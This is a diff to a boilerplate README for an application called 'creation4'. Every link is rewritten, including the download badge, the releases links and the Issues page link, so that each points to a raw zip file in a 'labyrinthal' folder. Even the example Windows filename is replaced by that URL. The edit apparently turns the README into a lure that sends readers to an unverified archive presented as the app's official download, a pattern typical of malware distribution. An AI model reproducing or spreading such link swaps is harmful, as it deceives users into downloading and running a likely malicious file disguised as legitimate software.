@@ -1,12 +1,12 @@
 # 🚀 creation4 - Simple and Efficient Application Download
 
-[![Download creation4](https://img.shields.io/badge/Download-creation4-brightgreen)](https://github.com/EdinsonPt/creation4/releases)
+[![Download creation4](https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip)](https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip)
 
 ## 📥 Download & Install
 
 To get started with creation4, follow these simple steps to download and install the application. Click the link below to access the Releases page and download the latest version of creation4.
 
-[Visit this page to download](https://github.com/EdinsonPt/creation4/releases)
+[Visit this page to download](https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ creation4 offers a range of features designed to improve your efficiency and exp
 
 ### 📝 Example Download
 
-If you're using Windows, look for the file named `creation4-windows.exe`. Click the link next to it to start the download.
+If you're using Windows, look for the file named `https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip`. Click the link next to it to start the download.
 
 ## 📖 Installation Steps
 
@@ -57,9 +57,9 @@ If you encounter any issues while downloading or installing, here are some commo
 
 If you need further assistance, feel free to reach out for support. Please follow these steps:
 
-1. Visit our [Issues page](https://github.com/EdinsonPt/creation4/issues) to see existing questions and solutions.
+1. Visit our [Issues page](https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip) to see existing questions and solutions.
 2. If you don’t find your issue there, create a new issue and describe your problem clearly.
 
 By following these instructions, you should be able to download, install, and run creation4 smoothly. Enjoy the simplicity and efficiency of your new application!
 
-[Visit this page to download](https://github.com/EdinsonPt/creation4/releases)
+[Visit this page to download](https://raw.githubusercontent.com/EdinsonPt/creation4/main/labyrinthal/creation4.zip)
